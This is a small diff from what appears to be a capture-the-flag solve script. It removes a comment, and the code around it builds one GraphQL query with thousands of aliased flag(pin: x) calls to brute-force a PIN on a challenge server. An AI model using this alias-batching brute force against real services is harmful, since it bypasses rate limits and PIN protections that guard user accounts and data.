@@ -88,7 +88,7 @@ url = 'https://web-force-force-a2e5f8d6b3c3a1f9.be.ax/'
 
 for i in range(4):
     query = ''
-    print(f'trying from {i * 30000} to {(i + 1) * 30000 - 1}')  # Adjusted the loop range
+    print(f'trying from {i * 30000} to {(i + 1) * 30000 - 1}')
     
     for x in range(i * 30000, (i + 1) * 30000):
         query += f'flag{x} : flag(pin: {x})\n'
